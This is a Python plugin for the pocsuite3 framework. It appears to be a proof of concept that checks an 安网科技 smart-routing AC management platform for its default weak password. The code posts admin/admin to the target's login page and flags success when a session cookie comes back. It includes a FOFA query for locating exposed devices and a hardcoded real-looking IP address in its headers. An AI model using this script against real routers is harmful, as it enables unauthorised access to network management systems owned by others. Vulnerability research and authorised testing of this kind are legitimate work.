from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class XAMPP(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "2022071703"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "yuema"  # PoC作者的大名
    vulDate = "2022-07-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.xypbk.com/IOT%E5%AE%89%E5%85%A8/%E5%AE%89%E7%BD%91%E7%A7%91%E6%8A%80%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1/%E5%AE%89%E7%BD%91%E7%A7%91%E6%8A%80-%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4.md"]  # 漏洞地址来源,0day不用写
    name = "安网科技-智能路由系统默认弱口令漏洞PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "智能路由系统"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """广州安网贝腾信息科技有限公司智能路由系统AC集中管理平台存在默认弱口令，攻击者可以通过此默认口令登录平台。"""  # 漏洞简要描述
    pocDesc = """直接使用即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        url = self.url.strip()
        full_url = f"{url}/login.cgi"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "Origin": "http://113.128.246.234:800", "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": "http://113.128.246.234:800/login.html", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        data = {"user": "admin", "password": "admin"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            res = requests.post(url=full_url, headers=headers, data=data,verify=False, timeout=9,allow_redirects=False)
            # 判断是否存在漏洞
            if res.status_code == 200 and "Set-Cookie" in res.headers:
                result.append(url)
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(XAMPP)